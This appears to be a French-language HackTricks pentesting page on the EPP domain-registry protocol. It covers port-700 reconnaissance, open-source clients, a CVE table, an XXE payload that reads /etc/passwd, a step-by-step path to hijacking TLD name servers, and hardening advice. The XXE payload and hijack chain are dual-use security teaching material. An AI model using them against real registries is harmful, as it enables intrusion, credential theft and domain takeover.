# 700 - Pentesting EPP

{{#include ../banners/hacktricks-training.md}}

## Informations de base

Le Protocole de Provisionnement Extensible (EPP) est un protocole réseau utilisé pour la **gestion des noms de domaine et d'autres ressources internet** par les registres de noms de domaine et les bureaux d'enregistrement. Il permet l'automatisation des processus d'enregistrement, de renouvellement, de transfert et de suppression de noms de domaine, garantissant un cadre de communication standardisé et sécurisé entre différentes entités dans le système de noms de domaine (DNS). L'EPP est conçu pour être flexible et extensible, permettant l'ajout de nouvelles fonctionnalités et commandes à mesure que les besoins de l'infrastructure internet évoluent.

Fondamentalement, c'est l'un des protocoles qu'un **bureau d'enregistrement TLD va offrir aux bureaux d'enregistrement de domaines** pour enregistrer de nouveaux domaines dans le TLD.

### Pentest

[**Dans cet article très intéressant**](https://hackcompute.com/hacking-epp-servers/) vous pouvez voir comment certaines recherches en sécurité ont trouvé que plusieurs **implémentations de ce protocole** étaient vulnérables à XXE (XML External Entity) car ce protocole utilise XML pour communiquer, ce qui aurait permis aux attaquants de prendre le contrôle de dizaines de TLD différents.

---

## Énumération & Recon

Les serveurs EPP écoutent presque toujours sur TCP `700/tcp` via TLS. Un déploiement typique impose également **mutual-TLS (mTLS)**, donc le client doit présenter un certificat valide émis par l'autorité de certification du registre. Néanmoins, de nombreux déploiements privés de test ou de pré-production oublient ce contrôle :
```bash
# Banner-grabbing / TLS inspection
nmap -p700 --script ssl-cert,ssl-enum-ciphers <target>

# Check if mTLS is *really* required (it frequently is not!)
openssl s_client -connect <target>:700 -quiet \
-servername epp.test 2>/dev/null | head
```
Si le serveur ne termine pas la connexion après la poignée de main TLS, vous pouvez tenter d'envoyer un message `<hello/>` non authentifié :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<epp xmlns="urn:ietf:params:xml:ns:epp-1.0">
<hello/>
</epp>
```
### Clients open-source utiles pour les tests

* **epp-client (Go)** – activement maintenu, prend en charge TCP/TLS et EPP-over-HTTPS (RFC 8730) :
`go install github.com/domainr/epp/cmd/epp@latest`
* **gandi/go-epp** – bibliothèque client minimale qui peut facilement être instrumentée pour des workflows de fuzzing ou de style nuclei.
* **afq984/php-epp-client** – implémentation PHP utilisée par de nombreux petits registraires ; une cible pratique pour la révision de code.

Exemple de script minimal de connexion+vérification avec Go epp-client :
```go
package main
import (
"github.com/domainr/epp"
"crypto/tls"
)

func main() {
cfg := &tls.Config{InsecureSkipVerify: true}
c, _ := epp.DialTLS("epp.test:700", cfg)
c.Login("CLIENT_ID", "PASSWORD", nil)
resp, _ := c.DomainCheck("example","com")
println(resp)
}
```
---

## Faiblesses Courantes & Vulnérabilités 2023-2025

| Année | Composant | CWE | Impact |
|------|-----------|-----|--------|
| 2023 | CoCCA Registry < 3.5 | CWE-611 XXE | Lecture de fichier à distance & SSRF via charge utile `<epp>` conçue (patch : 2023-11-02) |
| 2024 | FRED EPP Server 2.x | CWE-322 Validation de certificat TLS insuffisante | Contournement de mTLS a permis une connexion non autorisée de registraire |
| 2025 | Panneau de registraire propriétaire | CWE-306 Authentification manquante pour une fonction critique | Point de terminaison d'approbation de transfert de domaine exposé via le pont EPP-HTTP |

### Charge utile XXE / SSRF (fonctionne contre de nombreuses implémentations Java/Spring)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<epp xmlns="urn:ietf:params:xml:ns:epp-1.0">
<command>
<check>
<domain:check xmlns:domain="urn:ietf:params:xml:ns:domain-1.0">
<domain:name>&xxe;</domain:name>
</domain:check>
</check>
</command>
</epp>
```
Lorsque le parseur est mal configuré (`XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES=true`), le contenu du fichier est renvoyé à l'intérieur de la structure `<resData>`.

### Autres constatations typiques

1. **Politique de mots de passe faibles** – Les phrases de passe de connexion EPP sont plus courtes que 8 caractères ; le brute-force est souvent réalisable car la spécification ne RECOMMANDE (pas n'exige) que la limitation de débit.
2. **Statut `registryLock` / `serverUpdateProhibited` manquant** – une fois authentifiés, les attaquants peuvent immédiatement mettre à jour les enregistrements NS et voler du trafic.
3. **Messages de sondage non signés** – certaines implémentations ne signent toujours pas les messages de questions-réponses de sondage, permettant le spoofing/phishing des opérateurs de registre.

---

## Chemin d'attaque : De zéro à détournement de TLD

1. Découvrir un point de terminaison EPP (souvent caché derrière un hôte générique comme `ot&e.<tld>.nic.<cc>`).
2. Abuser de l'une des faiblesses ci-dessus pour obtenir des identifiants de niveau registre (XXE → SSRF vers IMDSv1, exfiltration d'identifiants, ou contournement TLS).
3. Émettre des requêtes `<update>` pour changer les enregistrements `hostObj` du domaine vers des serveurs de noms contrôlés par l'attaquant.
4. (Optionnel) Soumettre un `<transfer>` pour déplacer le domaine vers un registraire contrôlé par l'attaquant – de nombreux registres s'appuient encore sur un **code d'authentification unique**.
5. Profiter : contrôle total de la zone DNS, capacité à demander des certificats TLS via ACME.

---

## Mesures défensives et durcissement

* Appliquer **mTLS avec des certificats clients par registraire** et épingler l'AC du registre.
* Définir `parserFeature secure-processing=true` ou équivalent pour éliminer XXE.
* Exécuter un **fuzzing continu** du parseur XML (par exemple, avec `go-fuzz` ou `jazzer` pour Java).
* Déployer des statuts **Registry Lock / server*Prohibited** pour les domaines de grande valeur.
* Surveiller la file d'attente `poll` pour des commandes `<transfer>` ou `<update>` suspectes et alerter en temps réel.
* Les amendements au contrat sur les abus DNS d'ICANN 2024 exigent que les registres prouvent les contrôles de limitation de débit et d'authentification – en tirer parti.

## Références

* ICANN Security and Stability Advisory Committee (SSAC). "SAC118: Conséquences de l'échec de l'opérateur de registre à mettre en œuvre des contrôles de sécurité EPP". 2024.
* HackCompute – "Hacking des serveurs EPP : abus de XXE pour détourner des TLD" (2023).
{{#include ../banners/hacktricks-training.md}}
